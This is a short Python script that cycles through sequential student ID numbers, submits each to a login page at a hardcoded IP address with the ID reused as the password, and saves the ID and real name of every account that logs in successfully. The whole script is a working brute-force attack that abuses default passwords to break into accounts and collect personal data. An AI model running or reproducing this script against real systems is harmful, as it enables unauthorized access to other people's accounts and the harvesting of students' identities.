import requests
import re

file = open('idAndname.txt', 'a+')
stid = 20181000
while True:
    pwd = stid
    url = 'http://219.216.96.176/login/loginproc.jsp'
    post_data = {
        'IndexStyle': '1',
        'stid': str(stid),
        'pwd': str(pwd)
    }
    response = requests.post(url, data=post_data)
    try:
        pattern = re.compile('(?<=欢迎你，).*?(?=！)')
        name = pattern.findall(response.text)[0]
        file.write(str(stid) + '    ' + name)
        print(str(stid) + '    ' + name)
    except Exception as e:
        stid += 1
        print("%d失败"%stid)
        continue
    stid += 1
file.close()